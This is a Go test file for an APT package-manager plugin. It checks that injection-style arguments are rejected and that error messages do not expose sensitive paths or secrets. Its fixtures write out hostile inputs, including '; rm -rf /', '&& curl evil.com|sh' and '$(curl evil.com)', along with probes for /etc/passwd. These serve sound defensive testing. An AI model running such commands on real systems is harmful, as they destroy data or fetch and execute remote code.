package main_test

import (
	. "github.com/onsi/ginkgo/v2"
	. "github.com/onsi/gomega"

	main "github.com/jameswlane/devex/packages/package-manager-apt"
)

var _ = Describe("APT Security", func() {
	var (
		aptInstaller *main.APTInstaller
	)

	BeforeEach(func() {
		aptInstaller = main.NewAPTPlugin()
	})

	Describe("Basic Security Validation", func() {
		Context("command argument validation", func() {
			It("should reject malicious apt arguments", func() {
				maliciousArgs := []string{
					"; rm -rf /",
					"&& curl evil.com|sh",
					"|| malicious-command",
					"`rm -rf /`",
					"$(curl evil.com)",
					"|sh",
				}

				for _, arg := range maliciousArgs {
					err := aptInstaller.Execute("install", []string{arg})
					Expect(err).To(HaveOccurred(),
						"Malicious argument '%s' should be rejected", arg)
				}
			})

			It("should validate shell metacharacters", func() {
				dangerousChars := []string{
					";", "&", "|", "`", "$", "(", ")", "<", ">", "\\",
				}

				for _, char := range dangerousChars {
					testArg := "safe" + char + "dangerous"
					err := aptInstaller.Execute("install", []string{testArg})
					Expect(err).To(HaveOccurred(),
						"Argument with dangerous character '%s' should be rejected", char)
				}
			})
		})
	})

	Describe("Error Message Security", func() {
		Context("error message sanitization", func() {
			It("should not leak sensitive information in error messages", func() {
				maliciousInputs := []string{
					"/etc/passwd",
					"$HOME/.local/share",
					"/root/.bashrc",
					"$(whoami)",
					"~/.cache/apt",
				}

				for _, input := range maliciousInputs {
					err := aptInstaller.Execute("install", []string{input})
					if err != nil {
						errorMsg := err.Error()

						// Error should not contain the raw malicious input
						Expect(errorMsg).NotTo(ContainSubstring(input),
							"Error message should not leak malicious input")

						// Error should not contain sensitive paths
						Expect(errorMsg).NotTo(ContainSubstring("/etc/passwd"))
						Expect(errorMsg).NotTo(ContainSubstring("/root/"))
						Expect(errorMsg).NotTo(ContainSubstring("/.cache/"))
					}
				}
			})

			It("should sanitize command outputs in logs", func() {
				// Test that any command output doesn't contain dangerous content
				err := aptInstaller.Execute("list", []string{})

				// This might succeed or fail depending on apt state
				// but should not expose dangerous information
				if err != nil {
					errorMsg := err.Error()
					Expect(errorMsg).NotTo(ContainSubstring("password"))
					Expect(errorMsg).NotTo(ContainSubstring("token"))
					Expect(errorMsg).NotTo(ContainSubstring("secret"))
				}
			})
		})
	})
})
